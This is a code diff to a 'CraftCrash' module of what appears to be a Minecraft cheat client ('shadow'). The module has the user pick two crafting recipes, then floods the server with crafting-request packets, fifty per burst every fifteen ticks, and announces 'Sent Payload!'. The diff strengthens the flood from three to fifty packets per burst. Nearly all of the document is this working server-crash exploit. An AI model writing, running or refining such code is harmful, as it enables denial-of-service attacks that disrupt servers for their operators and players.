@@ -5,6 +5,9 @@
 package net.shadow.client.feature.module.impl.crash;
 
 import net.minecraft.client.util.math.MatrixStack;
+import net.minecraft.item.ItemStack;
+import net.minecraft.item.Items;
+import net.minecraft.nbt.NbtString;
 import net.shadow.client.feature.gui.notifications.Notification;
 import net.shadow.client.feature.module.Module;
 import net.shadow.client.feature.module.ModuleType;
@@ -12,8 +15,12 @@ import net.shadow.client.helper.event.EventListener;
 import net.shadow.client.helper.event.EventType;
 import net.shadow.client.helper.event.Events;
 import net.shadow.client.helper.event.events.PacketEvent;
+
+import java.util.Random;
+
 import net.minecraft.client.gui.screen.ingame.CraftingScreen;
 import net.minecraft.network.packet.c2s.play.CraftRequestC2SPacket;
+import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
 import net.minecraft.recipe.Recipe;
 
 public class CraftCrash extends Module {
@@ -32,7 +39,6 @@ public class CraftCrash extends Module {
 
     @EventListener(type=EventType.PACKET_SEND)
     public void onPacketSend(PacketEvent event){
-        if(!this.isEnabled()) return;
         if (event.getPacket() instanceof CraftRequestC2SPacket packet) {
             if (isListening) {
                 if (stick == null) {
@@ -51,19 +57,28 @@ public class CraftCrash extends Module {
     @Override
     public void tick() {
         if (client.currentScreen instanceof CraftingScreen && !isListening) {
+            ticks++;
             int sync = client.player.currentScreenHandler.syncId;
-            superticks++;
-            if (superticks % 15 == 0) {
-                for (int i = 0; i < 3; i++) {
+            if(ticks % 15 == 0){
+                Notification.create(1000, "CraftCrash", Notification.Type.SUCCESS, "Disabling stream...");
+                for(int i = 0; i < 50; i++){
                     client.player.networkHandler.sendPacket(new CraftRequestC2SPacket(sync, stick, true));
                     client.player.networkHandler.sendPacket(new CraftRequestC2SPacket(sync, buton, true));
                 }
+            }
+            if(ticks % 75 == 0){
+                Notification.create(1000, "CraftCrash", Notification.Type.SUCCESS, "Sent Payload!");
+                this.setEnabled(false);
             }
         }
     }
 
     @Override
     public void enable() {
+        this.isListening = true;
+        stick = null;
+        buton = null;
+        Notification.create(1000, "CraftCrash", Notification.Type.INFO, "Click two crafting recipies");
     }
 
     @Override
